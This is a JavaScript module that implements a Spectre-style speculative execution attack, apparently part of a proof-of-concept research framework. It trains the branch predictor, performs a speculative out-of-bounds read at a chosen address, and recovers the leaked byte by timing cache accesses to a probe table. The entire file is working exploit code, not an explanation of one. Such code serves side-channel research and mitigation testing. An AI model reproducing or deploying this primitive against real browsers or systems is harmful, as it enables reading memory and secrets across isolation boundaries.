import {mean, zIndex} from "../helper/math.js";
import timer_promise from "../timer.js";
import code_buffer from "../wasm-buffer.js";
import IndicatorTable from "../indicator-table.js";

let junk = 0;
const TRAINING_CONSTANT = 10;

export default
(async () => {
    let _probeTable;
    
    const timer = await timer_promise;
    
    const secret_table = new Uint8Array(4 << 12);
    {
        const array_fill_view = new Float64Array(secret_table.buffer);
        for (let i = 0; i < array_fill_view.length; ++i) {
            array_fill_view[i] = Math.random();
        }
    }

    return {
        get secret_table() {
            return secret_table;
        },
        speculativelyReadMemory
    };
    
    function speculativelyReadMemory(address, speculative_training_number, min_iterations, max_cache_hit_number, page_size, probe_length) {
        const time_tables = [];
        let max_indicator;
        let max_indicator_index;
        const mean_times = [];
        const indicator_table = new IndicatorTable(probe_length);
        
        let i = 0;
        let total_iterations = 0;
        for (; i < min_iterations; ++total_iterations) {
            if (!time_tables.length) {
                _speculativelyReadAddress();
            }
            const time_table = time_tables.pop();
            // process time table
            const mean_time = indicator_table.processTimetable(time_table, max_cache_hit_number);
            // lower limit check is done by indicator_table
            if (mean_time) {
                mean_times.push(mean_time);
            } else {
                // console.warn("slow timer");
                if (total_iterations > min_iterations) {
                    break;
                }
                continue;
            }
            // console.log(`%cprobe index time ${time_table[probe_index]}`, "font-size: .9em");
            max_indicator = Math.max(...indicator_table);
            let current_max_indicator_index = indicator_table.indexOf(max_indicator);
            // check for multiple maxima
            for (let i = current_max_indicator_index + 1; i < indicator_table.length; ++i) {
                if (max_indicator == indicator_table[i]) {
                    current_max_indicator_index = undefined;
                    break;
                }
            }
            // max_indicator_index changed
            if (max_indicator_index != current_max_indicator_index) {
                i = (current_max_indicator_index !== undefined) | 0;
                max_indicator_index = current_max_indicator_index;
                // console.warn("max_indicator_index changed");
            } else {
                ++i;
            }
        }
        const mean_time = mean(mean_times);
        if (i < min_iterations) {
            max_indicator_index = undefined;
            // console.warn("index test failed");
        }
        // prepare results
        let second_indicator = -Infinity;
        for (let i = 0; i < indicator_table.length; ++i) {
            const indicator = indicator_table[i];
            if (indicator > second_indicator && i != max_indicator_index) {
                second_indicator = indicator;
            }
        }
        const second_ratio = second_indicator / max_indicator;
        // console.log("second ratio", second_ratio);
        return {
            max_indicator_index,
            second_ratio,
            // normalized_indicator_table: indicator_table.getNormalized(),
            mean_time,
            total_iterations
        };
    
        function probeTable(probe_table) {
            const time_table = new Uint32Array(probe_length);
            // const probe_table = new Uint8Array(probe_length * page_size);
            const random_offset = Math.random() * 256 | 0;
            // console.log("random offset", random_offset);
            // probe table
            for (let i = 0; i < probe_length; ++i) {
                const probe_index = ((i + random_offset) % 256 + 1) * page_size;
                timer.restore();
                junk ^= probe_table[probe_index];
                time_table[(i + random_offset) % 256] = timer.load();
            }
            time_tables.push(time_table);
        }
        
        function _speculativelyReadAddress() {
            // run the speculative execution at least twice
            // the first run causes secret_table[fixed_index] to be loaded from RAM (cache miss)
            // this means that the speculative branch takes long to execute and thus is likely to get caught by the branch rollback
            // the second time that the speculative execution runs, secret_table[fixed_index] is already cached and therefore fast
            for (let j = 0; j < TRAINING_CONSTANT; ++j) {
                const valid_access_indicator_array = new Uint8Array(speculative_training_number * page_size);
                for (let i = 0; i < speculative_training_number; ++i) {
                    const invalid_access = !((i + 1) % speculative_training_number);
                    const fixed_index = address & -invalid_access;
                    const fixed_page_size = page_size * invalid_access;
                    const probe_table = new Uint8Array((probe_length + 1) * page_size);
                    // load condition from RAM so speculative execution gets triggered
                    if (!valid_access_indicator_array[i * page_size] && !invalid_access) {
                        const secret_value = secret_table[fixed_index];
                        // map valid accesses to the address (probe_tables)
                        // map invalid accesses to their respective probe boxes
                        junk ^= probe_table[(1 + secret_value) * fixed_page_size];
                    }
                    // _log(89);
                    if (invalid_access && j == TRAINING_CONSTANT - 1) {
                        // probe table
                        probeTable(probe_table);
                    }
                }
            }
        }
    }
})();